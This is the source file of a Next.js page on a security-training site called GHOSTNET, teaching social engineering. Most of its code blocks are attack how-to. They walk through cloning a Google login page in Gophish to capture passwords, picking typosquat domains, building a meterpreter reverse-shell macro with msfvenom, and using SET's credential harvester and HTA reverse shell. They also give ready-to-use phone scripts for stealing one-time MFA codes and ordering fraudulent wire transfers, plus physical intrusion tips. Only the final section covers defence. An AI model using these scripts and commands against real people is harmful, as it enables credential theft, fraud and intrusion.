'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff6ec7'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#6a4a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080408', border: `1px solid #3a0028`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#3a0028', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#9a8a9a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,110,199,0.05)', border: '1px solid rgba(255,110,199,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#ff6ec7', letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)

export default function SocialEngineering() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#6a4a5a' }}>
        <Link href="/" style={{ color: '#6a4a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>SOCIAL ENGINEERING</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(255,110,199,0.08)`, border: `1px solid rgba(255,110,199,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/social-engineering/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a1020', borderRadius: '3px', color: '#6a4a5a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#6a4a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(255,110,199,0.35)` }}>SOCIAL ENGINEERING</h1>
        <p style={{ color: '#6a4a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>Phishing · Vishing · Pretexting · Spear phishing · Credential harvesting · Gophish · Physical security</p>
      </div>

      <H2>01 — Psychology of Manipulation</H2>
      <P>Social engineering is the art of manipulating people into taking actions they wouldn't normally take. Unlike hacking software, it targets the human operating the software. It is consistently the number one initial access vector in real-world breaches — because a person can be tricked even when the technology is perfectly secure.</P>
      <P>Social engineering exploits human psychology, not software. Understanding these principles is both the attack and the defence.</P>
      <Pre label="// CIALDINI'S 6 PRINCIPLES — HOW ATTACKERS USE THEM">{`# 1. AUTHORITY
# Pretend to be: IT department, CEO, auditor, government
# "This is John from IT security — we detected a breach on your account"
# "The CEO needs this wire transferred immediately"

# 2. SCARCITY / URGENCY
# "Your account will be locked in 24 hours"
# "Respond immediately or access will be revoked"
# Creates panic → bypasses rational thinking

# 3. SOCIAL PROOF
# "Your colleagues have already updated their credentials"
# "All other employees completed this security training"
# Normalizes the malicious action

# 4. LIKING / RAPPORT
# Spend time building relationship before the ask
# Mirror their speech patterns, reference common interests
# "I noticed you went to X university — I went to Y nearby"

# 5. RECIPROCITY
# Give something first — a "helpful" document, useful info
# Victim feels obligated to return the favour
# Malicious attachment in a "helpful" email

# 6. COMMITMENT / CONSISTENCY
# Get small commitments first, escalate gradually
# "Can you confirm your department?" → "Can you confirm your email?"
# → "Can you confirm your password reset?"

# MOST EXPLOITED EMOTIONS:
# Fear, greed, curiosity, urgency, helpfulness`}</Pre>

      <H2>02 — Phishing Infrastructure</H2>
      <Note>Phishing is sending fake emails (or messages) designed to look legitimate. The goal is to steal credentials, install malware, or trick someone into transferring money. 'Spear phishing' is targeted at a specific person using personalized details. 'Whaling' targets executives. The infrastructure — domains, servers, tracking pixels — is what makes professional phishing campaigns hard to detect.</Note>
      <Pre label="// BUILD A PROFESSIONAL PHISHING CAMPAIGN">{`# Gophish — open-source phishing framework
# Download: https://getgophish.com

# Install:
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip && chmod +x gophish
./gophish
# Dashboard: https://localhost:3333 (admin/gophish)

# Campaign setup flow:
# 1. Sending Profile → SMTP server to send from
# 2. Landing Page → clone a real login page
# 3. Email Template → craft phishing email
# 4. Users & Groups → import target list
# 5. Campaign → combine all above, set schedule

# Clone a legitimate login page:
# In Gophish: Landing Pages → New Page → Import Site
# URL: https://accounts.google.com
# Check: Capture submitted data
# Check: Capture passwords

# Domain selection (typosquatting):
# microsoft.com → m1crosoft.com, micros0ft.com, rnicrosoft.com
# google.com → g00gle.com, googl3.com
# paypal.com → paypa1.com, paypallogin.com

# Make it look legitimate:
# SSL certificate (free): certbot certonly -d phishing-domain.com
# Email: SPF, DKIM, DMARC records on your domain
# Match target company's email signature exactly

# Track metrics:
# Open rate, click rate, credential submission rate
# Time from send to click
# Which departments clicked most`}</Pre>

      <H2>03 — Spear Phishing — Targeted Attacks</H2>
      <P>Generic phishing casts a wide net — millions of emails with obvious red flags. Spear phishing is the sniper version: one email, one target, customized with real details from their LinkedIn, company website, and social media. Detection rates for spear phishing are much lower because the email looks completely legitimate to the recipient.</P>
      <Pre label="// OSINT → CUSTOM TARGETED EMAIL">{`# Step 1: Reconnaissance on target
# LinkedIn: job title, department, manager, projects, technologies used
# Company website: team page, press releases, partners
# Twitter/X: recent posts, interests, complaints
# GitHub: code they wrote, tools they use

# Step 2: Build pretext
# Bad pretext: "Click here to verify your account"
# Good pretext: "Hi Sarah, following up from the Salesforce migration 
#   meeting last Tuesday — as discussed with Mike, here's the updated
#   Q3 reporting template. I've also included the API credentials for 
#   the staging environment John mentioned."

# Step 3: Weaponize attachment
# Malicious Word doc (macros):
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=YOUR_IP LPORT=443 -f vba > payload.vba
# Paste into Word macro: Alt+F11 → insert module

# Malicious PDF:
# Exploit PDF reader vulnerabilities
# Embed link to credential harvester

# Step 4: Perfect the email
# Match exact email format of their IT department
# Reference real employees by name
# Use internal terminology from their job postings
# Send from similar domain: it-helpdesk@company-secure.com

# Tools:
# TheHarvester — find employee emails
# Hunter.io — email format discovery
# Maltego — relationship mapping`}</Pre>

      <H2>04 — Vishing (Voice Phishing)</H2>
      <Note>Vishing (voice phishing) uses phone calls instead of email. The caller impersonates IT support, executives, vendors, or government agencies. It is extremely effective because most people are conditioned to be helpful on the phone and feel social pressure not to challenge an authority figure. Real-time MFA bypass (reading back the OTP code) is one of the most damaging modern variants.</Note>
      <Pre label="// PHONE-BASED SOCIAL ENGINEERING SCRIPTS">{`# Caller ID spoofing: 
# SpoofCard, MySudo, Twilio (with custom CallerID)
# Make it appear you're calling from internal extension

# IT Helpdesk pretext (most common):
"""
"Hi, this is Mark from IT Security. We've detected some unusual login
activity on your account from an IP in [random country]. I need to
verify your identity before we lock the account as a precaution.

Can you confirm your username? And I'll need to send you a 
one-time code — when you receive the text, can you read it back to me?"
"""
# → MFA bypass via real-time phishing

# Executive impersonation (vishing for wire transfer):
"""
"Hi Sarah, this is [CEO name]. I'm in a board meeting and I need you 
to process an urgent wire transfer — I'll explain everything later.
This is time-sensitive and confidential."
"""

# Vendor impersonation:
"""  
"Hi, calling from Microsoft support — we've detected malicious activity
from your organization's IP range. I need to install a diagnostic tool.
Can you go to support.microsoft.com/remote and enter code 123456?"
"""

# Winning tactics:
# Never give target time to think
# Escalate urgency throughout the call
# Make target feel they're helping you/the company
# If challenged — have a backup story ready
# Research target's name, manager, department before calling`}</Pre>

      <H2>05 — SET — Social Engineer Toolkit</H2>
      <Pre label="// AUTOMATED SOCIAL ENGINEERING WITH SET">{`# Install (Kali included, others):
git clone https://github.com/trustedsec/social-engineer-toolkit
cd social-engineer-toolkit && pip install -r requirements.txt
python3 setup.py

# Launch:
sudo setoolkit

# Main menu:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules

# Most used: 1 → 2 (Website Attack Vectors) → 3 (Credential Harvester)
# Enter target URL → SET clones it → hosts on your IP
# Send victim: http://YOUR_IP (looks like real site)
# Credentials printed in terminal as they're submitted

# Spear Phishing with SET:
# 1 → 1 (Spear-Phishing Attack Vectors) → 1 (Perform a Mass Email Attack)
# Choose payload (Metasploit backdoor)
# SET creates malicious attachment
# Sends to target emails via configured SMTP

# Create malicious HTA (HTML Application):
# 1 → 2 → 5 (HTA Attack)
# Victim visits URL → browser downloads and runs .hta
# Executes embedded PowerShell → reverse shell`}</Pre>

      <H2>06 — Physical Social Engineering</H2>
      <P>Physical social engineering means bypassing physical security through deception rather than technology. Tailgating (following someone through a secure door), badge cloning, and USB drops have compromised organizations with multi-million dollar technical security stacks. Humans are trained to be polite, helpful, and non-confrontational — all of which attackers exploit.</P>
      <Pre label="// PHYSICAL INTRUSION TECHNIQUES">{`# Tailgating:
# Follow authorized person through secure door
# Carry boxes (people hold doors for people with stuff)
# Dress as delivery person, HVAC tech, electrician
# Act confident — hesitation triggers suspicion

# Badge cloning:
# RFID/HID proximity cards can be cloned
# Proxmark3 — read card from ~15cm in crowd
# Clone to new card → enter facility

# USB drops:
# Label USB: "Q4 Salary Review Confidential"
# Drop in company parking lot, bathroom, reception
# Employee finds → curiosity overwhelms security training
# Plug in → executes payload

# Malicious USB payload (Rubber Ducky):
# Keyboard emulation device looks like USB stick
# Types commands at 1000 WPM → user can't react
# Inject reverse shell in 3 seconds
# Script: https://github.com/hak5/usbrubberducky-payloads

# Dumpster diving:
# Employee handbooks → internal terminology
# Org charts → targets for spear phishing
# Old hardware → may contain data
# Client lists, contracts → business intel

# Pretexting scenarios that work:
# "I'm from the fire marshall's office, routine inspection"
# "IT is upgrading your workstation, need 10 minutes"
# "I'm a new employee, my badge isn't working yet"
# "I'm here for the 2pm meeting with [real employee name from LinkedIn]"`}</Pre>

      <H2>07 — Defence & Awareness Training</H2>
      <Note>The most effective defense against social engineering is a culture where employees feel empowered to challenge unusual requests, verify identities through a second channel, and report suspicious contacts without fear of embarrassment. Technical controls like DMARC and hardware MFA help, but the human layer is what ultimately stops these attacks.</Note>
      <Pre label="// BUILDING HUMAN FIREWALL">{`# Why technical controls fail:
# Even perfect security → one call to the help desk
# → "I forgot my password, can you reset it? I'm the CFO"

# Red flags to teach employees:
# 1. Urgency — real IT never demands instant action
# 2. Unusual requests — IT won't ask for your password
# 3. Unknown sender — verify via second channel
# 4. Too good to be true — prize emails
# 5. Pressure to bypass process — "don't tell your manager"

# Verification protocol:
# Received call from "IT"? Hang up, call back on known internal number
# Received email requesting action? Call sender via phone book, not reply
# Wire transfer request from "CEO"? In-person or video verify

# Phishing simulation programmes:
# KnowBe4, Proofpoint Security Awareness
# Run monthly simulations → track click rates → train clickers
# Reward employees who report suspicious emails

# Technical controls:
# DMARC/DKIM/SPF → prevents domain spoofing
# Email gateway → blocks known phishing domains
# Browser isolation → malicious links opened in sandbox
# Hardware MFA (YubiKey) → defeats credential phishing
# Zero-trust → even "trusted" users limited access`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #3a0028`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a4a5a' }}>← DASHBOARD</Link>
        <Link href="/modules/social-engineering/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(255,110,199,0.4)`, borderRadius: '4px', background: `rgba(255,110,199,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
